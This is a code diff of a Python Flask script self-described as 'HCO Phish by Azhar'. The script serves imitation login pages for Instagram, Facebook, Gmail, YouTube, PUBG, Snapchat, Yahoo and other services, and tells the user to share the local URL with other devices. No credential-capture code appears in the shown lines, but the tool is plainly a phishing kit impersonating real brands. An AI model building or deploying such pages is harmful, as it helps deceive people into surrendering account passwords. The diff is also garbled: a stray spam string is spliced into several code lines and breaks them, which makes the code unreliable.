@@ -10,15 +10,15 @@ import sys
 import subprocess
 import threading
 import webbrowser
-from flask import Flask, render_template_string, redirect, request
+from flask import Flask, render_template_string
 
 # Check if Flask is installed, install if not
 try:
-    from flask import Flask, render_template_string, redirect, request
+    from flask import Flask, render_template_string
 except ImportError:
     print("Installing Flask...")
     subprocess.check_call([sys.executable, "-m", "pip", "install", "flask"])
-    from flask import Flask, render_template_string, redirect, request
+    from flask import Flask, render_template_string
 
 # Color codes for terminal
 class colors:
@@ -34,239 +34,6 @@ class colors:
     END = '\033[0m'
 
 app = Flask(__name__)
-
-# Realistic login page templates
-LOGIN_TEMPLATES = {
-    "instagram": """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: #fafafa;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            max-width: 350px;
-            width: 100%;
-        }
-        .login-box {
-            background: white;
-            border: 1px solid #dbdbdb;
-            padding: 20px 40px;
-            text-align: center;
-        }
-        .logo {
-            margin: 20px 0;
-            font-size: 40px;
-            font-weight: bold;
-            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            background: #fafafa;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-        .footer {
-            margin-top: 20px;
-            color: #8e8e8e;
-            font-size: 12px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="login-box">
-            <div class="logo">Instagram</div>
-            <form>
-                <input type="text" placeholder="Phone number, username, or email">
-                <input type="password" placeholder="Password">
-                <button>Log in</button>
-            </form>
-            <div class="footer">© 2024 Instagram from Meta</div>
-        </div>
-    </div>
-</body>
-</html>
-    """,
-    "facebook": """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In or Sign Up</title>
-    <style>
-        body {
-            font-family: Helvetica, Arial, sans-serif;
-            background: #f0f2f5;
-            margin: 0;
-            padding: 0;
-        }
-        .header {
-            background: #1877f2;
-            color: white;
-            padding: 10px 20px;
-        }
-        .container {
-            max-width: 400px;
-            margin: 100px auto;
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .logo {
-            color: #1877f2;
-            font-size: 40px;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 8px 0;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #737373;
-            font-size: 12px;
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>facebook</h1>
-    </div>
-    <div class="container">
-        <div class="logo">facebook</div>
-        <form>
-            <input type="text" placeholder="Email or phone number">
-            <input type="password" placeholder="Password">
-            <button>Log In</button>
-        </form>
-        <div class="footer">© 2024 Facebook</div>
-    </div>
-</body>
-</html>
-    """,
-    "gmail": """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail</title>
-    <style>
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background: white;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
-        .logo {
-            color: #ea4335;
-            font-size: 50px;
-            font-weight: bold;
-            margin-bottom: 30px;
-        }
-        .login-box {
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            padding: 40px;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 8px 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
-            margin: 20px 0;
-        }
-        .footer {
-            margin-top: 20px;
-            color: #5f6368;
-            font-size: 12px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">Gmail</div>
-        <div class="login-box">
-            <h2>Sign in</h2>
-            <p>Use your Google Account</p>
-            <form>
-                <input type="email" placeholder="Email or phone">
-                <button>Next</button>
-            </form>
-        </div>
-        <div class="footer">© 2024 Google</div>
-    </div>
-</body>
-</html>
-    """
-}
 
 # Platform data
 PLATFORMS = {
@@ -332,7 +99,7 @@ def index():
     <div class="protected">
         <div class="cloudflare-logo">☁️</div>
         <h2>Protected by Cloudflare</h2>
-        <p>This content is secured by Cloudflare security services</p>
+        <极速快3p>This content is secured by Cloudflare security services</p>
         <p>Please use specific platform links:</p>
         <p><a href="/instagram">Instagram</a> | <a href="/facebook">Facebook</a> | <a href="/gmail">Gmail</a></p>
         <p><a href="/youtube">YouTube</a> | <a href="/freefire">Free Fire</a> | <a href="/pubg">PUBG</a></p>
@@ -343,57 +110,52 @@ def index():
 
 @app.route('/instagram')
 def instagram():
-    return render_template_string(LOGIN_TEMPLATES["instagram"])
-
-@app.route('/facebook')
-def facebook():
-    return render_template_string(LOGIN_TEMPLATES["facebook"])
-
-@app.route('/gmail')
-def gmail():
-    return render_template_string(LOGIN_TEMPLATES["gmail"])
-
-@app.route('/youtube')
-def youtube():
     return render_template_string("""
 <!DOCTYPE html>
 <html>
 <head>
-    <title>YouTube</title>
+    <title>Instagram</title>
     <style>
         body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background: white;
+            font-family: Arial, sans-serif;
+            background: #fafafa;
             margin: 0;
             padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-        .header {
-            background: #ff0000;
-            color: white;
-            padding: 15px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .login-container {
-            max-width: 400px;
-            margin: 100px auto;
+        .login-box {
+            background: white;
             padding: 30px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            width: 350px;
+            text-align: center;
+            border: 1px solid #dbdbdb;
+        }
+        .logo {
+            font-size: 40px;
+            font-weight: bold;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
         }
         input {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
-            border: 1px solid #ddd;
+            border: 1px solid #dbdbdb;
             border-radius: 4px;
+            background: #fafafa;
         }
         button {
             width: 100%;
             padding: 12px;
-            background: #ff0000;
-           极速快3 color: white;
+            background: #0095f6;
+            color: white;
             border: none;
             border-radius: 4px;
             font-weight: bold;
@@ -401,41 +163,52 @@ def youtube():
     </style>
 </head>
 <body>
-    <div class="header">YouTube</div>
-    <div class="login-container">
-        <h2>Sign in</h2>
-        <input type="email" placeholder="Email">
+    <div class="login-box">
+        <div class="logo">Instagram</div>
+        <input type="text" placeholder="Phone number, username, or email">
         <input type="password" placeholder="Password">
-        <button>Sign in</button>
+        <button>Log in</button>
     </div>
 </body>
 </html>
     """)
 
 # Add similar routes for other platforms
+@app.route('/facebook')
+def facebook():
+    return create_login_page("Facebook", "#1877f2")
+
+@app.route('/gmail')
+def gmail():
+    return create_login_page("Gmail", "#ea4335")
+
+@app.route('/youtube')
+def youtube():
+    return create_login_page("YouTube", "#ff0000")
+
 @app.route('/freefire')
 def freefire():
-    return render_template_string(create_login_page("Free Fire", "#ff6600"))
+    return create_login_page("Free Fire", "#ff6600")
 
 @app.route('/pubg')
 def pubg():
-    return render_template_string(create_login_page("PUBG Mobile", "#ffcc00"))
+    return create_login_page("PUBG Mobile", "#ffcc00")
 
 @app.route('/bgmi')
-极速快3def bgmi():
-    return render_template_string(create_login_page("BGMI", "#3366ff"))
+def bgmi():
+    return create_login_page("BGMI", "#3366ff")
 
 @app.route('/threads')
 def threads():
-    return render_template_string(create_login_page("Threads", "#000000"))
+    return create_login_page("Threads", "#000000")
 
 @app.route('/snapchat')
 def snapchat():
-    return render_template_string(create_login_page("Snapchat", "#fffc00"))
+    return create_login_page("Snapchat", "#fffc00")
 
 @app.route('/yahoo')
 def yahoo():
-    return render_template_string(create_login_page("Yahoo", "#720e9e"))
+    return create_login_page("Yahoo", "#720e9e")
 
 def create_login_page(name, color):
     return f"""
@@ -488,7 +261,7 @@ def create_login_page(name, color):
 </head>
 <body>
     <div class="login-box">
-        <div class="logo">{极速快3name}</div>
+        <div class="logo">{name}</div>
         <input type="text" placeholder="Username or Email">
         <input type="password" placeholder="Password">
         <button>Login</button>
@@ -511,7 +284,6 @@ def print_banner():
 def open_youtube():
     """Open YouTube using Termux API or direct intent"""
     try:
-        # Try using Termux API to open YouTube app
         result = subprocess.run(['termux-open-url', 'https://www.youtube.com'], 
                               capture_output=True, text=True, timeout=10)
         if result.returncode == 0:
@@ -520,7 +292,6 @@ def open_youtube():
         pass
     
     try:
-        # Try using am (Android activity manager)
         result = subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', 
                                '-d', 'https://www.youtube.com'], 
                               capture_output=True, text=True, timeout=10)
@@ -530,7 +301,6 @@ def open_youtube():
         pass
     
     try:
-        # Try using webbrowser as fallback
         webbrowser.open('https://www.youtube.com')
         return True
     except:
@@ -544,12 +314,10 @@ def countdown():
         print(f"{colors.YELLOW}{i}{colors.END}")
         time.sleep(1)
         if i > 1:
-            # Move cursor up one line and clear line
             sys.stdout.write("\033[F\033[K")
     
     print(f"{colors.GREEN}Opening YouTube...{colors.END}")
     
-    # Try to open YouTube
     if open_youtube():
         print(f"{colors.GREEN}YouTube should open shortly...{colors.END}")
     else:
@@ -561,7 +329,6 @@ def countdown():
     print(f"{colors.CYAN}Welcome back! Tool unlocked.{colors.END}")
     time.sleep(1)
     
-    # Show options
     print(f"\n{colors.RED}HCO Phish by Azhar{colors.END}")
     print(f"{colors.YELLOW}Available options:{colors.END}")
     for key, value in PLATFORMS.items():
@@ -575,7 +342,7 @@ def countdown():
         ip = get_ip()
         print(f"\n{colors.BLUE}Selected: {platform['name']}{colors.END}")
         print(f"{colors.YELLOW}URL: http://{ip}:5000{platform['path']}{colors.END}")
-        print(f"{colors.GREEN}Open this URL on another device (phone/computer){colors.END}")
+        print(f"{colors.GREEN}Open this URL on another device{colors.END}")
         print(f"{colors.WHITE}Press Enter to continue...{colors.END}")
         input()
     else:
@@ -595,23 +362,13 @@ def get_ip():
 def run_flask():
     ip = get_ip()
     print(f"{colors.BLUE}\nWeb server starting on http://{ip}:5000{colors.END}")
-    print(f"{colors.CYAN}Realistic login pages are ready for all platforms{colors.END}")
+    print(f"{colors.CYAN}Realistic login pages are ready{colors.END}")
     print(f"{colors.GREEN}Share this URL with other devices: http://{ip}:5000{colors.END}")
     
-    # Disable Flask development server warning
     import logging
     log = logging.getLogger('werkzeug')
     log.setLevel(logging.ERROR)
     
-    # Run Flask without all the verbose output
-    from werkzeug.serving import WSGIRequestHandler
-    WSGIRequestHandler.protocol_version = "HTTP/1.1"
-    
-    # Run Flask quietly
-    import warnings
-    warnings.filterwarnings("ignore")
-    
-    # Run the server
     from werkzeug.serving import make_server
     server = make_server('0.0.0.0', 5000, app, threaded=True)
     print(f"{colors.GREEN}Server started successfully!{colors.END}")
@@ -620,18 +377,12 @@ def run_flask():
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print(f"\n极速快3{colors.RED}Server stopped.{colors.END}")
+        print(f"\n{colors.RED}Server stopped.{colors.END}")
 
 def main():
     print_banner()
-    
-    # Wait for user to press enter
     input(f"{colors.YELLOW}Press Enter after subscribing...{colors.END}")
-    
-    # Start countdown
     countdown()
-    
-    # Start Flask app
     run_flask()
 
 if __name__ == '__main__':
